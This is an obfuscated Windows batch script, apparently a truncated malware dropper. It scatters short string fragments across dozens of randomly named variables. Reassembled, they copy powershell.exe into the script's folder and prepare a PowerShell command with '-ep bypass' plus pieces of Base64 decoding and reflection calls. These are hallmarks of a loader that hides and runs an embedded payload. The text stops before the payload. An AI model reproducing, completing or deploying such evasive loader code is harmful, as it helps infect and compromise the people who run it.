@echo off
set "DLgksewZip=\W"
set "xcrPvYekuq=em"
set "ltDtWlIYUk=nd"
set "RqnaruBAQY= C"
set "BecfloIrYS=Po"
set "VJIWgOhHXl= /"
set "gAvtXTzWZM=xe"
set "egVLMhwjnP=in"
set "MnotYGReVj=s\"
set "MBKJGLVhwr=ws"
set "WRUSKKbjPO=we"
set "wNNkfxiusD=we"
set "QVIVxMASdb=po"
set "aDULBgDkqX=y "
set "WVDPORFZxJ=rs"
set "BWZlFiwzMT=co"
set "edrYSXOrBT=he"
set "DAOTTmtmCI=\v"
set "goivVYNADj=ll"
set "EkyjehkNBi=Wi"
set "GVINaUJiwM=ow"
set "vfDLRPGgor=do"
set "hXzgHUrTgF=.e"
set "HiOVRDQceL=ll"
set "moMWnqdxAD=he"
set "uDcKaSWaaA=32"
set "ObhTNuYNkD=py"
set "uLUPwjhpUE=0\"
set "SUrYxbHKyR=:\"
set "SwnYFhbRXO=1."
set "jNYINzqYcl=Sy"
set "tIQokJBLjk=st"
set "ypLQCDvlea=rS"
set "palQYBuZTa=cd"
set "aXOybcOOZp= %~dp0"
set "usUgKNawlU=em.I"
set "qrxFGzEImt=);$B"
set "yvEkxHLINk=eZ.T"
set "jNuXKyxgUa=.-16"
set "OjVPjewvLd='dqR"
set "LKBcZWbiDV=aKlc"
set "ZwCZRrKhgC=tsWi"
set "aquUMmLUgs=:: '"
set "FyBcNnbeDR=brea"
set "JhjaQOgvzX=-ep "
set "EqvYWbsBIt=oArr"
set "OiVMpQJfHk=::De"
set "otUbLfSnMS=[Sys"
set "YYnKpxYlYz=tS46"
set "SfjHrZyNTu=736u"
set "kirfszeHIl=.Cre"
set "AhPBQCFHHq=oin "
set "IjInqoTAhs=;$jg"
set "RtYRmJPbxs=tem."
set "IGHjkDdQNw=Uz.I"
set "dRyptHMGtk==');"
set "RzHvHALKJJ=bypa"
set "vIdnibuUQt=nirt"
set "fRnoXoVWZk=m.Re"
set "aQXgfEYGFj=Obje"
